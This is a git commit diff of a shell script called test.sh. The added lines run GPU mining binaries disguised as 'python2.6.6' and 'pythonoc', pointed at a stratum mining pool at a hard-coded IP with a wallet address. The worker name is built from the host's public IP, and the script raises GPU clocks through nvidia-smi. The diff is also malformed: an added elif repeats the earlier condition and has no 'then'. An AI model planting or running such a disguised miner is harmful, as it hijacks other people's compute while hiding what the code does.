9e9b63a1e7480fafd5699b68c70bbddfffeefdd7
Ayoub Jadouli <Ayoub JADOULI>
2021-04-04 01:36:02 +0100

    tstok32

--- test.sh
+++ test.sh
@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 31 ########################'
+echo '##################### Test N 32 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -23,6 +23,8 @@ echo > cuoutdef
 echo > oout
 echo > results.txt 
 
+
+
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
     while true
@@ -35,7 +37,10 @@ then
 
     done
 
-else
+elif [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
+    #### Max PAram
+    nvidia-smi -pm ENABLED -i 0
+    nvidia-smi -ac 5001,1590
     while true
     do
         date
@@ -45,6 +50,17 @@ else
         tail -f oout 
 
         echo '#################    Final 1200s result    #################'   
-     
+
+else
+    while true
+    do
+        date
+        ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
+        #./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80   --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &
+        while true;do nvidia-smi  -q -i 0 -d CLOCK;sleep 50;done &
+        tail -f oout 
+
+        echo '#################    Final 1200s result    #################'   
+
     done
 fi
